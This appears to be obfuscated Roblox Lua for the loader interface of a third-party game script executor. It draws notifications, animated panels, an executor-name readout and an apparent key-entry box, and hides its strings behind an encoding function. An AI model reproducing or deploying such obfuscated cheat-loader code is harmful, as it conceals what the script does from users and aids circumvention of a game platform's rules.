local _oy = table.pack(LocalPlayer:FindFirstChild(_de4yl({115,40,31,40,29,75,46,16,74},{35,68,126,81,120,57,105,101})))
_bq[1], _bq[2] = _fa, _ly
local _jf = table.pack(table.unpack(_oy, 1, _oy.n))
table.move(_jf, 1, _jf.n, 3, _bq)

for _ma, _xy in ipairs(_bq) do
	if _xy then
		for _ma, _su in ipairs({_de4yl({31,23,12,50,72,80,108,45,38},{88,79,83,121,45,41,43}), _de4yl({52,46,41,44,66,70,82,7,5},{115,118,118,120,45,39,33})}) do
			local _mn = _xy:FindFirstChild(_su)
			if _mn then
				_mn:Destroy()
			end
		end
	end
end

local _ka = Instance.new(_de4yl({38,37,69,53,87,27,1,66,57},{117,70,55,80,50}))
_ka.Name = _de4yl({22,126,121,110,62,71,85,78,34},{81,38,38,58})
_ka.ResetOnSpawn = false
_ka.IgnoreGuiInset = true
_ka.DisplayOrder = 2147483647
func22(_ka)
local _vk = Instance.new(_de4yl({119,70,55,54,84},{49,52,86,91}))
_vk.AnchorPoint = Vector2.new(0.5, 0)
_vk.Position = UDim2.new(0.5, 0, 0, 18)
_vk.Size = UDim2.fromOffset(340, 0)
_vk.AutomaticSize = Enum.AutomaticSize.Y
_vk.BackgroundTransparency = 1
_vk.Parent = _ka
local _gf = Instance.new(_de4yl({48,28,46,2,20,25,116,4,44,13,30,19},{101,85,98,107,103,109,56}))
_gf.Padding = UDim.new(0, 8)
_gf.SortOrder = Enum.SortOrder.LayoutOrder
_gf.HorizontalAlignment = Enum.HorizontalAlignment.Center
_gf.Parent = _vk
local _dt = {ok = _u.ok, warn = _u.warn, bad = _u.bad}
local _s = 0

local function func23(_tz)
	return string.format(
		"#%02x%02x%02x",
		math.floor(_tz.R * 255 + 0.5),
		math.floor(_tz.G * 255 + 0.5),
		math.floor(_tz.B * 255 + 0.5)
	)
end

function _l(_tz, _lz, _om, _sm)
	_s = _s + 1
	local _zf = _vk:GetChildren()
	local _f = 0

	for _ma, _e in ipairs(_zf) do
		if _e:IsA(_de4yl({46,76,94,2,92},{104,62,63,111,57})) then
			_f = _f + 1
		end
	end

	if _f >= 4 then
		for _ma, _o in ipairs(_zf) do
			if _o:IsA(_de4yl({111,10,51,81,76},{41,120,82,60})) then
				_o:Destroy()
				break
			end
		end
	end

	local _d = _dt[_sm] or _u.soft
	local _sr = Instance.new(_de4yl({58,81,47,22,40},{124,35,78,123,77,107,116}))
	_sr.LayoutOrder = _s
	_sr.Size = UDim2.new(1, 0, 0, 0)
	_sr.AutomaticSize = Enum.AutomaticSize.Y
	_sr.BackgroundColor3 = Color3.fromRGB(26, 19, 44)
	_sr.BackgroundTransparency = 1
	_sr.BorderSizePixel = 0
	_sr.Parent = _vk
	func12(_sr, UDim.new(0, 16))
	func12(_sr, UDim.new(0, 16))
	local _dc = Instance.new(_de4yl({116,59,8,2,61,10,72,23,33,4},{33,114,79,112,92,110}))
	_dc.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(170, 140, 255))
	_dc.Rotation = 90
	_dc.Parent = _sr
	local _k = func13(_sr, Color3.new(1, 1, 1), 1)
	_k.Transparency = 1
	local _oh = Instance.new(_de4yl({39,46,110,15,7,22,14,80,9},{114,103,62,110,99}))
	local _mu = UDim.new(0, 11)
	local _kn = UDim.new(0, 12)
	_oh.PaddingTop = _mu
	_oh.PaddingBottom = _kn
	local _pq = UDim.new(0, 16)
	local _mw = UDim.new(0, 16)
	_oh.PaddingLeft = _pq
	_oh.PaddingRight = _mw
	_oh.Parent = _sr
	local _gf = Instance.new(_de4yl({126,14,50,72,31,95,11,31,88,3,94,51},{43,71,126,33,108}))
	_gf.Padding = UDim.new(0, 3)
	_gf.SortOrder = Enum.SortOrder.LayoutOrder
	_gf.Parent = _sr
	local _ow = Instance.new(_de4yl({6,70,13,60,124,51,65,16,36},{82,35,117,72,48}))
	_ow.LayoutOrder = 1
	_ow.BackgroundTransparency = 1
	_ow.Size = UDim2.new(1, 0, 0, 16)
	_ow.RichText = true
	local _ly = func23(_d)
	local _oy = table.pack(tostring(_tz))
	_ow.Text = (_de4yl({104,34,93,89,5,123,35,59,40,93,69,76,121,101,39,102,12,213,230,212,124,123,34,93,89,5,101,96,116,97,65},{84,68,50,55,113,91,64})).format('<font color="%s">●</font>  %s', _ly, table.unpack(_oy, 1, _oy.n))
	_ow.TextColor3 = _u.soft
	_ow.TextSize = 13
	_ow.Font = Enum.Font.GothamBold
	_ow.TextXAlignment = Enum.TextXAlignment.Left
	_ow.TextTransparency = 1
	_ow.TextTruncate = Enum.TextTruncate.AtEnd
	_ow.Parent = _sr
	local _or = Instance.new(_de4yl({105,95,53,17,42,62,95,95,33},{61,58,77,101,102,95}))
	_or.LayoutOrder = 2
	_or.BackgroundTransparency = 1
	_or.Size = UDim2.new(1, 0, 0, 0)
	_or.AutomaticSize = Enum.AutomaticSize.Y
	_or.Text = tostring(_lz)
	_or.TextColor3 = _u.text
	_or.TextSize = 14
	_or.Font = Enum.Font.GothamMedium
	_or.TextWrapped = true
	_or.TextXAlignment = Enum.TextXAlignment.Left
	_or.TextYAlignment = Enum.TextYAlignment.Top
	_or.TextTransparency = 1
	_or.Parent = _sr

	local function func(_tz)
		local _w = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		_t:Create(_sr, _w, {BackgroundTransparency = _tz and 0.16 or 1}):Play()
		_t:Create(_k, _w, {Transparency = _tz and 0.7 or 1}):Play()
		_t:Create(_ow, _w, {TextTransparency = _tz and 0 or 1}):Play()
		_t:Create(_or, _w, {TextTransparency = _tz and 0 or 1}):Play()
	end

	func(true)

	task.delay(_om or 4, function()
		if not _sr.Parent then
			return
		end

		func(false)
		task.wait(0.3)

		if _sr.Parent then
			_sr:Destroy()
		end
	end)
end

local _pb = Instance.new(_de4yl({13,18,61,67,59,67,25,4,38},{94,113,79,38,94,45}))
_pb.Name = _de4yl({1,107,15,120,35,74,23,70,47},{70,51,80,51})
_pb.ResetOnSpawn = false
_pb.IgnoreGuiInset = true
_pb.DisplayOrder = 2147483645
func22(_pb)

local _md, result3 = pcall(function()
	local _ka = Instance.new(_de4yl({57,31,23,78,37,81,21,31,21},{106,124,101,43,64,63,82}))
	_ka.Name = _de4yl({33,97,123,20,26,54},{102,57,36,70,115,91,92,76})
	_ka.ResetOnSpawn = false
	_ka.IgnoreGuiInset = true
	_ka.DisplayOrder = 2147483646
	func22(_ka)
	local _vk = Instance.new(_de4yl({97,54,92,15,74},{39,68,61,98,47,122}))
	_vk.Size = UDim2.fromScale(1, 1)
	_vk.BackgroundTransparency = 1
	_vk.BorderSizePixel = 0
	_vk.Parent = _ka
	func12(_vk, UDim.new(0, 40))
	func12(_vk, UDim.new(0, 40))

	local _n = {
		NumberSequenceKeypoint.new(0, 0.35),
		NumberSequenceKeypoint.new(0.2, 0.35),
		NumberSequenceKeypoint.new(0.25, 0),
		NumberSequenceKeypoint.new(0.3, 0.35),
		NumberSequenceKeypoint.new(0.7, 0.35),
		NumberSequenceKeypoint.new(0.75, 0),
		NumberSequenceKeypoint.new(0.8, 0.35),
		NumberSequenceKeypoint.new(1, 0.35),
	}

	local _e = func13(_vk, Color3.new(1, 1, 1), 4)
	local _o = func15(_e, _u.violet, _u.fuchsia, 0)
	_o.Transparency = NumberSequence.new(_n)
	local _d = func13(_vk, Color3.new(1, 1, 1), 14)
	local _k = func15(_d, _u.violet, _u.fuchsia, 0)

	_k.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.2, 1),
		NumberSequenceKeypoint.new(0.25, 0.4),
		NumberSequenceKeypoint.new(0.3, 1),
		NumberSequenceKeypoint.new(0.7, 1),
		NumberSequenceKeypoint.new(0.75, 0.4),
		NumberSequenceKeypoint.new(0.8, 1),
		NumberSequenceKeypoint.new(1, 1),
	})

	local _nl = _r.RenderStepped:Connect(function()
		local _e = os.clock()
		_o.Rotation = _e * 75 % 360
		_k.Rotation = _e * 75 % 360
	end)

	_pb.Destroying:Connect(function()
		_nl:Disconnect()
		_ka:Destroy()
	end)
end)

if not _md then
	warn(_de4yl({29,45,114,6,37,47,7,119,6,27,3,46,10,84,62,43,74,76,71,62,42,15,78,28,119},{70,106,42,38,87}) .. tostring(result3))
end

local _gn = func14(_pb, UDim2.new(), UDim2.fromScale(1, 1), Color3.new(0, 0, 0), nil)
_gn.Active = false
_gn.BackgroundTransparency = 1
local _sr = Instance.new(_de4yl({21,18,15,53,54},{83,96,110,88}))
_sr.AnchorPoint = Vector2.new(0, 0)
_sr.Position = UDim2.fromScale(0, 0)
_sr.Size = UDim2.fromScale(1, 1)
_sr.BackgroundTransparency = 1
_sr.Parent = _pb
local _at = Instance.new(_de4yl({104,22,45,76,64,58,88},{61,95,126,47,33,86}))
_at.Parent = _sr
local _ax = Instance.new(_de4yl({23,5,29,21,95},{81,119,124,120,58,61}))
_ax.AnchorPoint = Vector2.new(0, 0)
_ax.Position = UDim2.fromScale(0, 0)
_ax.Size = UDim2.fromScale(1, 1)
_ax.BackgroundColor3 = Color3.new(1, 1, 1)
_ax.BorderSizePixel = 0
_ax.Parent = _sr
func15(_ax, _u.bg1, _u.bg2, 125)
func12(_ax, UDim.new(0, 40))
func12(_ax, UDim.new(0, 40))
local _yd = func13(_ax, Color3.new(1, 1, 1), 3)
local _nn = func15(_yd, _u.violet, _u.fuchsia, 0)

_nn.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.5),
	NumberSequenceKeypoint.new(0.2, 0.5),
	NumberSequenceKeypoint.new(0.25, 0),
	NumberSequenceKeypoint.new(0.3, 0.5),
	NumberSequenceKeypoint.new(0.7, 0.5),
	NumberSequenceKeypoint.new(0.75, 0),
	NumberSequenceKeypoint.new(0.8, 0.5),
	NumberSequenceKeypoint.new(1, 0.5),
})

local _dl = Instance.new(_de4yl({118,74,60,66,0,44,100,71,68,39,68},{53,43,82,52,97,95,35}))
_dl.BackgroundTransparency = 1
_dl.Size = UDim2.fromScale(1, 1)
_dl.Parent = _ax
func12(_dl, UDim.new(0, 40))
func12(_dl, UDim.new(0, 40))

pcall(function()
	local _e = func13(_ax, Color3.new(1, 1, 1), 9)
	local _o = func15(_e, _u.violet, _u.fuchsia, 0)

	_o.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.2, 1),
		NumberSequenceKeypoint.new(0.25, 0.45),
		NumberSequenceKeypoint.new(0.3, 1),
		NumberSequenceKeypoint.new(0.7, 1),
		NumberSequenceKeypoint.new(0.75, 0.45),
		NumberSequenceKeypoint.new(0.8, 1),
		NumberSequenceKeypoint.new(1, 1),
	})

	local _nl = _r.RenderStepped:Connect(function()
		_o.Rotation = os.clock() * 75 % 360
	end)

	_pb.Destroying:Connect(function()
		_nl:Disconnect()
	end)
end)

local _tp = {f = func17(_dl, _u.violet, 8), x = 0.15, y = 0.2, sp = 0.35, ph = 0, k = 1.3}
local _jv = {}
_jv[2], _jv[1], _jv[3] = {f = func17(_dl, _u.fuchsia, 8), x = 0.85, y = 0.85, sp = 0.28, ph = 2, k = 1.1}, _tp, {f = func17(_dl, _u.blue, 8), x = 0.6, y = 0.1, sp = 0.22, ph = 4, k = 0.8}
local _wb = {}
local _pv = Random.new(7)

for _no = 1, 34 do
	local _lx = _pv:NextInteger(2, 5)
	local _pq = UDim2.new()
	local _ug = UDim2.fromOffset(_lx, _lx)
	local _zz = _no % 3 == 0 and _u.fuchsia or _u.soft
	local _zh = Instance.new(_de4yl({38,83,87,17,37},{96,33,54,124,64,108,55}))
	_zh.BorderSizePixel = 0
	_zh.Position = _pq
	_zh.Size = _ug
	_zh.BackgroundColor3 = _zz
	_zh.Parent = _dl
	func12(_zh, UDim.new(1, 0))
	func12(_zh, UDim.new(1, 0))
	_zh.BackgroundTransparency = _pv:NextNumber(0.55, 0.9)

	_wb[_no] = {
		f = _zh,
		x = _pv:NextNumber(),
		y = _pv:NextNumber(),
		v = _pv:NextNumber(0.015, 0.05),
		sw = _pv:NextNumber(0.5, 1.6),
		ph = _pv:NextNumber(0, 6),
	}
end

local _ed = Instance.new(_de4yl({3,52,23,33,32},{69,70,118,76}))
_ed.AnchorPoint = Vector2.new(0.5, 0.5)
_ed.Position = UDim2.fromScale(0.5, 0.5)
_ed.Size = UDim2.fromOffset(880, 440)
_ed.BackgroundTransparency = 1
_ed.Parent = _ax


local _mr = Instance.new(_de4yl({114,71,61,67,100,87,49,67,73,76},{38,34,69,55}))
_mr.Name = _de4yl({42,25,55,21,91,78,46,66,36,24,53,12,124,73,41,83,2,24},{109,118,83,99,62,60,93,39})
_mr.AnchorPoint = Vector2.new(1, 0)
_mr.Position = UDim2.new(1, -18, 0, 16)
_mr.Size = UDim2.fromOffset(76, 32)
_mr.BackgroundColor3 = _u.card
_mr.BorderSizePixel = 0
_mr.Text = _de4yl({38,122,118,106,103,8,177,252,172},{111,52,48,37,71,40,83})
_mr.TextColor3 = _u.soft
_mr.TextSize = 12
_mr.Font = Enum.Font.GothamBold
_mr.AutoButtonColor = true
_mr.ZIndex = 30
_mr.Parent = _ed
func12(_mr, UDim.new(0, 9))
local _ue = Instance.new(_de4yl({45,48,53,34,71,61,77,29},{120,121,102,86,53,82,38}))
_ue.Color = _u.violet
_ue.Transparency = 0.2
_ue.Thickness = 1
_ue.Parent = _mr

local _vi = Instance.new(_de4yl({5,75,21,24,93},{67,57,116,117,56,56}))
_vi.Name = _de4yl({5,89,86,70,72,48,69,87,121,67,36,89,64,93,76,54,95,93,94},{66,54,50,48,45})
_vi.AnchorPoint = Vector2.new(1, 0)
_vi.Position = UDim2.new(1, -18, 0, 56)
_vi.Size = UDim2.fromOffset(290, 226)
_vi.BackgroundColor3 = _u.panel
_vi.BorderSizePixel = 0
_vi.Visible = false
_vi.ZIndex = 30
_vi.Parent = _ed
func12(_vi, UDim.new(0, 12))
local _of = Instance.new(_de4yl({7,2,119,4,37,61,32,65},{82,75,36,112,87}))
_of.Color = _u.violet
_of.Transparency = 0.15
_of.Thickness = 1.2
_of.Parent = _vi
local _ry = Instance.new(_de4yl({99,59,106,45,23,82,27,84,43},{54,114,58,76,115}))
_ry.PaddingTop = UDim.new(0, 14)
_ry.PaddingBottom = UDim.new(0, 12)
_ry.PaddingLeft = UDim.new(0, 14)
_ry.PaddingRight = UDim.new(0, 14)
_ry.Parent = _vi
local _fx = Instance.new(_de4yl({113,43,21,23,35,77,22,19,93,13,44,10},{36,98,89,126,80,57,90,114}))
_fx.Padding = UDim.new(0, 7)
_fx.SortOrder = Enum.SortOrder.LayoutOrder
_fx.Parent = _vi

local function addInfoLine(_xu, _ha, _xq, _pi)
    local _do = Instance.new(_de4yl({106,70,57,87,57,95,65,36,79},{62,35,65,35,117}))
    _do.Name = _de4yl({55,65,11,1,110},{126,47,109,110,49,84,50,38}) .. tostring(_xq)
    _do.LayoutOrder = _xq
    _do.Size = UDim2.new(1, 0, 0, _pi and 25 or (_xu == _de4yl({46,120,26,108,21,46},{125,44,91,56,64}) and 48 or 28))
    _do.BackgroundTransparency = 1
    _do.TextXAlignment = Enum.TextXAlignment.Left
    _do.TextYAlignment = Enum.TextYAlignment.Center
    _do.TextWrapped = true
    _do.RichText = true
    _do.Font = _pi and Enum.Font.GothamBold or Enum.Font.GothamMedium
    _do.TextSize = _pi and 16 or 12
    _do.TextColor3 = _pi and _u.soft or _u.text
    _do.Text = _pi and _xu or (_de4yl({105,38,3},{85,68,61,119,63,40,119}) .. _xu .. _de4yl({6,117,24,3,102,96},{58,90,122,61,70,64,77,97}) .. _ha)
    _do.ZIndex = 31
    _do.Parent = _vi
end

addInfoLine(_de4yl({5,113,113,28,7,108,102,15,98,206,170,198,210},{66,62,53,74}), "", 1, true)
addInfoLine(_de4yl({22,109,117,117,126,37,89,13,102},{68,34,55,57,49,125,121}), _de4yl({31,26,38,3,47,60,101,1,20,38,6,43,32,73,35},{70,123,66,112,78,82,58}), 2, false)
addInfoLine(_de4yl({11,104,104,1,28,117,127},{72,58,45,64}), _de4yl({126,50,67,24,31,61,7,3,70,27,31,163,184,246,146},{39,83,39,107,126,83}), 3, false)
addInfoLine(_de4yl({116,112,127,30,21,21},{39,36,62,74,64,70}), _de4yl({4,116,41,39,4,117,57,37,2,105,92,52,101,100,57,32,0,116,40,37,4,107,92,63,28,105,56,37,6,102,40,41,101,127,92,54,0,117,51,76,8,98,46,47,28,7,48,35,4,99,57,40},{69,39,124,108}), 4, false)
_mr.Activated:Connect(function()
    _vi.Visible = not _vi.Visible
end)

local _rv = Instance.new(_de4yl({48,8,10,89,4,45,60},{101,65,89,58}))
_rv.Parent = _ed

local function func25()
	local ViewportSize = CurrentCamera.ViewportSize
	local _e = math.min((ViewportSize.X - 40) / 880, (ViewportSize.Y - 40) / 440, 1.5)
	_rv.Scale = math.max(0.3, _e)
end

func25()
CurrentCamera:GetPropertyChangedSignal(_de4yl({110,50,80,85,85,92,74,47,102,75,95,86},{56,91,53,34,37,51})):Connect(func25)

local function func26(_tz, _lz, _om)
	local Position = _tz.Position
	local _e = UDim2.fromOffset(0, _om or 22)
	_tz.Position = Position + _e

	task.delay(_lz, function()
		if _tz.Parent then
			_t:Create(_tz, _y, {Position = Position}):Play()
		end
	end)
end

local _oe = Instance.new(_de4yl({6,31,42,78,29},{64,109,75,35,120,62,115,71}))
_oe.BackgroundTransparency = 1
_oe.Position = UDim2.fromOffset(28, 22)
_oe.Size = UDim2.fromOffset(96, 96)
_oe.Parent = _ed
local _pf = func17(_oe, _u.violet, 6)
_pf.Position = UDim2.fromOffset(48, 48)
_pf.Size = UDim2.fromOffset(150, 150)

local function func27(_tz, _lz, _om, _sm, _um)
	local _vk = Instance.new(_de4yl({48,74,62,17,19},{118,56,95,124}))
	_vk.AnchorPoint = Vector2.new(0.5, 0.5)
	_vk.Position = UDim2.fromOffset(48, 48)
	_vk.Size = UDim2.fromOffset(_tz, _tz)
	_vk.BackgroundTransparency = 1
	_vk.Parent = _oe
	func12(_vk, UDim.new(1, 0))
	func12(_vk, UDim.new(1, 0))
	local _e = func13(_vk, Color3.new(1, 1, 1), _lz)
	local _o = func15(_e, _om, _sm, 0)
	func18(_o, _um)
	return _vk
end

local _mq = func27(94, 2.5, _u.violet, _u.fuchsia, 2)
local _aa = func27(78, 1.5, _u.soft, _u.violet, 3)
local _co = Instance.new(_de4yl({114,45,48,13,10},{52,95,81,96,111}))
_co.AnchorPoint = Vector2.new(0.5, 0.5)
_co.Position = UDim2.fromOffset(48, 48)
_co.Size = UDim2.fromOffset(94, 94)
_co.BackgroundTransparency = 1
_co.Parent = _oe
local _vp = func14(_co, UDim2.new(0.5, 0, 0, 0), UDim2.fromOffset(9, 9), Color3.new(1, 1, 1), nil)
_vp.AnchorPoint = Vector2.new(0.5, 0.5)
func12(_vp, UDim.new(1, 0))
func12(_vp, UDim.new(1, 0))

local function func28(_ol, _el)
	local _vk = Instance.new(_de4yl({47,91,76,75,74},{105,41,45,38,47,71,37,45}))
	_vk.AnchorPoint = Vector2.new(0.5, 0.5)
	_vk.Position = UDim2.fromOffset(48, 48)
	_vk.Size = UDim2.fromOffset(46, 46)
	_vk.Rotation = _ol
	_vk.BackgroundColor3 = Color3.new(1, 1, 1)
	_vk.BackgroundTransparency = _el
	_vk.BorderSizePixel = 0
	_vk.Parent = _oe
	func12(_vk, UDim.new(0, 12))
	func12(_vk, UDim.new(0, 12))
	func15(_vk, _u.violet, _u.fuchsia, 135)
	return _vk
end

local _fp = func28(0, 0)
local _pg = func28(45, 0.35)
func13(_fp, Color3.new(1, 1, 1), 1).Transparency = 0.6
local _rm = Instance.new(_de4yl({56,76,88,49,20,109,88,52,20,77},{113,33,57,86}))
_rm.BackgroundTransparency = 1
_rm.AnchorPoint = Vector2.new(0.5, 0.5)
_rm.Position = UDim2.fromOffset(48, 48)
_rm.Image = _de4yl({22,30,73,51,70,23,25,69,59,81,94,83,30,107,1,92,69,7,98,4,84,68,4,101,4,92,79},{100,124,49,82,53})
_rm.Size = UDim2.fromOffset(84, 84)
_rm.Parent = _oe
func12(_rm, UDim.new(1, 0))
func12(_rm, UDim.new(1, 0))
_fp.Visible = false
_pg.Visible = false

local _nt = func16(
	_ed,
	_de4yl({46,4,61,35,44,23,31,60,0,32,112,30,0,76,3,0,52},{119,101,89,80,77,121,63}),
	36,
	Color3.new(1, 1, 1),
	Enum.Font.GothamBlack,
	UDim2.fromOffset(140, 30),
	UDim2.fromOffset(360, 44)
)

local _dc = Instance.new(_de4yl({108,24,123,49,46,30,80,52,82,55},{57,81,60,67,79,122}))

_dc.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(196, 150, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
})

_dc.Parent = _nt

local _gy = func16(
	_ed,
	_de4yl({111,23,90,98,19,28,91,80,23,78},{36,114,35,66,96,101,40}),
	14,
	_u.sub,
	Enum.Font.Gotham,
	UDim2.fromOffset(142, 76),
	UDim2.fromOffset(300, 20)
)

pcall(function()
	local Text = _nt.Text
	_nt.Text = ""

	task.spawn(function()
		local _f = 1
		local _e = #Text

		if _e == _e then
			if not (1 > _e) then
				while _nt.Parent do
					_nt.Text = Text:sub(1, _f)
					task.wait(0.06)
					_f = _f + 1



					if _f > _e then
						return
					end
				end
				return
			end
		end
	end)

	local _nl = _r.RenderStepped:Connect(function()
		local _e = os.clock()
		_nt.Position = UDim2.fromOffset(140, 30 + 2 * math.sin(_e * 1.4))
		_gy.TextTransparency = 0.1 + 0.2 * (0.5 + 0.5 * math.sin(_e * 2.2))
	end)

	_pb.Destroying:Connect(function()
		_nl:Disconnect()
	end)
end)

local _sj = func14(_ed, UDim2.fromOffset(142, 102), UDim2.fromOffset(170, 26), _u.panel, 13)
func13(_sj, _u.stroke, 1)
local _wa = func14(_sj, UDim2.fromOffset(12, 9), UDim2.fromOffset(8, 8), _u.ok, 4)

func16(
	_sj,
	_de4yl({10,10,38,13,67,35,74,58,0,43,22,84,37,30,48,0,43},{89,111,69,120,49,70,106}),
	12,
	_u.soft,
	Enum.Font.GothamMedium,
	UDim2.fromOffset(28, 0),
	UDim2.fromOffset(140, 26)
)

local _sn = func14(_ed, UDim2.fromOffset(520, 24), UDim2.fromOffset(328, 176), _u.panel, 18)
_sn.ClipsDescendants = true
func15(_sn, Color3.fromRGB(34, 25, 58), _u.panel, 115)
local _pk = func13(_sn, _u.violet, 1)
_pk.Transparency = 0.55
_sn.BackgroundTransparency = 0.18
func15(_pk, _u.soft, _u.violet, 90)
local _gq = func14(_sn, UDim2.fromOffset(16, 16), UDim2.fromOffset(56, 56), _u.card, 14)
_gq.ClipsDescendants = true
func13(_gq, _u.violet, 1.5).Transparency = 0.35
func15(_gq, Color3.fromRGB(96, 62, 176), Color3.fromRGB(40, 28, 78), 135)
local soft = _u.soft
local GothamBold = Enum.Font.GothamBold
local _nh = UDim2.new()
local _sf = UDim2.fromScale(1, 1)
local _ia = func16(_gq, "", 15, soft, GothamBold, _nh, _sf, Enum.TextXAlignment.Center)
local _qy = Instance.new(_de4yl({16,60,43,77,12,21,48,40,79,5},{89,81,74,42,105}))
_qy.BackgroundTransparency = 1
_qy.Size = UDim2.fromScale(1, 1)
_qy.ImageTransparency = 1
_qy.ScaleType = Enum.ScaleType.Crop
_qy.ZIndex = 2
_qy.Parent = _gq
func12(_qy, UDim.new(0, 14))
func12(_qy, UDim.new(0, 14))

local _on = func16(
	_sn,
	_de4yl({13,35,84,4,40,34,82,78,111,98},{65,76,53,96}),
	17,
	_u.text,
	Enum.Font.GothamBold,
	UDim2.fromOffset(78, 16),
	UDim2.fromOffset(230, 24)
)

_on.TextTruncate = Enum.TextTruncate.AtEnd
local sub = _u.sub
local GothamBlack = Enum.Font.GothamBlack
local _qq = UDim2.fromOffset(76, 38)
local _gm = UDim2.fromOffset(14, 14)
local _nq = func16(_sn, "●", 10, sub, GothamBlack, _qq, _gm, Enum.TextXAlignment.Center)

local _yv = func16(
	_sn,
	_de4yl({3,13,2,89,23,41,11,0,20,82,110},{64,101,103,58,124}),
	13,
	_u.sub,
	Enum.Font.GothamMedium,
	UDim2.fromOffset(94, 40),
	UDim2.fromOffset(200, 24)
)

local function func29(_tz)
	_nq.Text = _tz and "✓" or "✖"
	_nq.TextColor3 = _tz and _u.ok or _u.bad
	_nq.TextSize = 14
end

func14(_sn, UDim2.fromOffset(16, 78), UDim2.fromOffset(296, 1), _u.stroke, nil)

func16(
	_sn,
	_de4yl({127,22,50,60,14,76,85,28},{58,110,87,95,123,56}),
	13,
	_u.sub,
	Enum.Font.Gotham,
	UDim2.fromOffset(16, 86),
	UDim2.fromOffset(140, 22)
)

local _xw = identifyexecutor and select(1, identifyexecutor()) or _de4yl({111,23,17,21,21,77,23},{58,121,122,123,122})
local text = _u.text
local GothamMedium = Enum.Font.GothamMedium
local _df = UDim2.fromOffset(156, 86)
local _zr = UDim2.fromOffset(156, 22)
func16(_sn, _xw, 13, text, GothamMedium, _df, _zr, Enum.TextXAlignment.Right)

func16(
	_sn,
	_de4yl({99,44,64,21,72,64},{48,88,33,97,61,51,102,56}),
	13,
	_u.sub,
	Enum.Font.Gotham,
	UDim2.fromOffset(16, 110),
	UDim2.fromOffset(140, 22)
)

local _ag = func16(
	_sn,
	_de4yl({115,41,60,23,56,93,61,48,94,56,93,40},{56,76,69,55,74}),
	13,
	_u.warn,
	Enum.Font.GothamMedium,
	UDim2.fromOffset(156, 110),
	UDim2.fromOffset(156, 22),
	Enum.TextXAlignment.Right
)

local function func30(text, _lz, _om)
	local _ga = Instance.new(_de4yl({2,5,71,9,57,47,0,92,57,14},{86,96,63,125,123,90,116,40}))
	_ga.Position = UDim2.fromOffset(_lz, 138)
	_ga.Size = UDim2.fromOffset(144, 28)
	_ga.BackgroundColor3 = _u.card
	_ga.BorderSizePixel = 0
	_ga.Text = text
	_ga.TextColor3 = _u.soft
	_ga.TextSize = 13
	_ga.Font = Enum.Font.GothamMedium
	_ga.AutoButtonColor = false
	_ga.Visible = false
	_ga.Parent = _sn
	func12(_ga, UDim.new(0, 10))
	func12(_ga, UDim.new(0, 10))
	func13(_ga, _u.stroke, 1)

	_ga.MouseEnter:Connect(function()
		local _n = {BackgroundColor3 = Color3.fromRGB(46, 36, 74)}
		_t:Create(_ga, _w, _n):Play()
	end)

	_ga.MouseLeave:Connect(function()
		_t:Create(_ga, _w, {BackgroundColor3 = _u.card}):Play()
	end)

	_ga.MouseButton1Click:Connect(function()
		func(_n[_om], text)
	end)

	return _ga
end

local _ez = func30(_de4yl({44,64,58,15,11,26,77},{104,41,73,108,100}), 16, _de4yl({24,63,73,10,60,43,0},{124,86,58,105,83,89,100}))
local _in = func30(_de4yl({42,17,81,62,38,47,78},{125,116,51,77,79,91,43}), 168, _de4yl({26,14,51,45,81,25,14},{109,107,81,94,56}))

local function func31()
	local _e = _n.discord ~= ""
	local _o = _n.website ~= ""
	local _d
	_ez.Visible, _d = _e, _in
	_d.Visible = _o

	if _e and _o then
		local _k = UDim2.fromOffset(16, 138)
		local _ly = UDim2.fromOffset(144, 28)
		_ez.Position = _k
		_ez.Size = _ly
		local _oy = UDim2.fromOffset(168, 138)
		local _jf = UDim2.fromOffset(144, 28)
		_in.Position = _oy
		_in.Size = _jf
	elseif _e then
		local _xy = UDim2.fromOffset(16, 138)
		local _su = UDim2.fromOffset(296, 28)
		_ez.Position = _xy
		_ez.Size = _su
	elseif _o then
		local _mn = UDim2.fromOffset(16, 138)
		local _gn = UDim2.fromOffset(296, 28)
		_in.Position = _mn
		_in.Size = _gn
	end
end

func31()
local _cb = func14(_sn, UDim2.fromOffset(10, 0), UDim2.fromOffset(308, 2), _u.soft, 1)
_cb.BackgroundTransparency = 0.6
func15(_cb, _u.violet, _u.fuchsia, 0)

local _gp = func16(
	_ed,
	_de4yl({101,60,44},{46,89,85,51}),
	13,
	_u.sub,
	Enum.Font.GothamMedium,
	UDim2.fromOffset(34, 222),
	UDim2.fromOffset(200, 18)
)

local _ii = func14(_ed, UDim2.fromOffset(32, 246), UDim2.fromOffset(816, 78), _u.panel, 22)
_ii.BackgroundTransparency = 0.22
local _tl = func13(_ii, Color3.fromRGB(78, 48, 140), 1.5)
local _av = func14(_ii, UDim2.fromOffset(18, 19), UDim2.fromOffset(40, 40), Color3.new(1, 1, 1), 12)
func15(_av, _u.violet, _u.fuchsia, 135)
local _xc = _u.text
local _ql = Enum.Font.GothamBold
local _ac = UDim2.new()
local _az = UDim2.fromScale(1, 1)
func16(_av, _de4yl({49,115,112},{122,54,41,109,52,120,37}), 11, _xc, _ql, _ac, _az, Enum.TextXAlignment.Center)
local _wj = Instance.new(_de4yl({124,15,68,36,59,50,80},{40,106,60,80,121,93}))
_wj.BackgroundTransparency = 1
_wj.Position = UDim2.fromOffset(74, 0)
_wj.Size = UDim2.new(1, -92, 1, 0)
_wj.PlaceholderText = _de4yl({5,59,33,1,11,117,35,61,0,28,117,49,55,12,78,61,63,32,16},{85,90,82,117,110})
_wj.PlaceholderColor3 = _u.muted
_wj.Text = ""
_wj.TextColor3 = _u.text
_wj.TextSize = 20
_wj.Font = Enum.Font.GothamMedium
_wj.TextXAlignment = Enum.TextXAlignment.Left
_wj.ClearTextOnFocus = false
_wj.Parent = _ii

_wj.Focused:Connect(function()
	_t:Create(_tl, _w, {Color = _u.soft, Thickness = 2.4}):Play()
end)

_wj.FocusLost:Connect(function()
	local _n = {Color = Color3.fromRGB(78, 48, 140), Thickness = 1.5}
	_t:Create(_tl, _w, _n):Play()
end)

